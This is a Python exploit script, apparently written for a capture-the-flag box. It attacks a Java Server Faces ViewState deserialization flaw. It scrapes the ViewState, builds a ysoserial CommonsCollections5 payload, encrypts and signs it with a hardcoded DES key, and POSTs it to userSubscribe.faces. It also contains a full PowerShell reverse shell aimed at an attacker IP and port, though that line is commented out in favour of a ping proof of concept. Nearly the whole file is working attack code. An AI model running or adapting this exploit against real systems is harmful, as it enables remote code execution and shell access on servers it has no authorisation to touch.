#!/usr/bin/python3
# Creator: brutuspt

import requests
from bs4 import BeautifulSoup
import sys
import argparse
import base64
import hmac
from hashlib import sha1
from Crypto.Cipher import DES
import os


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-tp", "--targetport", help="Target port", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)

args = parser.parse_args()

s = requests.Session()



def getViewState(target, port): 
    # Finding if viewState exists or not
    url = "http://%s:%s/userSubscribe.faces" % (target, str(port))
    try:
        r = s.get(url)
    except:
        print("Can't connect to the server, check the target's IP or Port")
        sys.exit()
    
    soup = BeautifulSoup(r.text, 'html.parser')
    viewState = soup.find('input', id='javax.faces.ViewState')['value']

    if viewState is None:
        print("[ERROR] No viewState found, check your target's IP or port")
        sys.exit()
    else:
        print("[INFO] Obtaining the ViewState value: " + str(viewState))
        return viewState


def generatePayload(ip, port):
    # Requirements of this ysoserial payload
    # Creating a payload for CommonsCollections using https://github.com/frohoff/ysoserial
    revshell_payload = "$client = New-Object System.Net.Sockets.TCPClient('" + str(ip) +"'," + str(port) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    base64_encoded = str(base64.b64encode(revshell_payload.encode("ascii")).decode("ascii"))
    
    print("[INFO] Generating the Ysoserial CommonCollections5 payload...")
    # ping test - Works
    os.system("/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsCollections5 'cmd /c ping -c " + str(ip) + "' > payload.bin")
    
    # Rev Shell - Does not Work - IDK why
    #os.system("/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsCollections5 'powershell -encodedCommand " + base64_encoded + "' > payload.bin")
    
    print("[SUCCESS] Ping POC payload successfully generated and written into disk!")
    payload = open('payload.bin', 'rb').read()
    return payload.strip()


def exploit(target, targetport, payload):

    url = "http://%s:%s/userSubscribe.faces" % (target, str(targetport))

    encryption_key = "SnNGOTg3Ni0="
    encryption_key_base64_bytes = encryption_key.encode("ascii")
    key = base64.b64decode(encryption_key_base64_bytes) # The secret key

    # using the DES.MODE_OFB mode
    obj = DES.new(key, DES.MODE_OFB)
    enc = obj.encrypt(payload) # Encrypting with DES from https://pycryptodome.readthedocs.io/en/latest/src/cipher/des.html
    
    hash_val = (hmac.new(key, bytes(enc), sha1).digest()) # Calculating hmac
    payload = enc + hash_val
    payload_b64 = base64.b64encode(payload) # Creating final payload in base64 format
    print("[INFO] Base64 encoding the encrypted the payload using the key found in web.xml.bak...")
    print("\n [INFO] Sending the encoded payload: " + str(payload_b64))

    #proxies = { "http" : "127.0.0.1:8080" }
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    data = {"javax.faces.ViewState": payload_b64}
    s.post(url, headers=headers, data=data) # proxies=proxies

    print("[SUCCESS] Payload delivered! Monitor your pings with tcpdump")


def main():
    print("Before running this exploit make sure you install/download the following dependencies proper commands: ")
    print("1. sudo apt install openjdk-11-jdk")
    print("2. pip3 install pycrypto")
    print("3. wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar")
    anwswer = str(input("Do you have the dependencies installed? (yes/no)"))

    if anwswer == "yes":
        print("\n")
        getViewState(args.target, args.targetport)
        payload = generatePayload(args.IP, args.port)
        exploit(args.target, args.targetport, payload)

    else:
        print("Exiting")
        sys.exit(1)

if __name__ == "__main__":
    main()
